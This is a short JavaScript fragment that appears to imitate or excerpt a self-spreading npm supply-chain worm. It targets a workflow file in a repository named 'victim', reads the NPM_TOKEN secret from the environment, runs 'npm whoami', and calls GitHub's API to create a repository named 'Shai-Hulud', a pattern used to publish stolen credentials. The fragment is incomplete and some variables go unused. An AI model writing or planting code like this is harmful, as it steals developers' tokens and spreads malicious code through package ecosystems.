const workflow = "/repos/victim/repo/contents/.github/workflows/shai-hulud-workflow.yml";
const command = "npm whoami";
const token = process.env.NPM_TOKEN;
fetch("https://api.github.com/user/repos", {method: "POST", body: JSON.stringify({name: "Shai-Hulud"})});
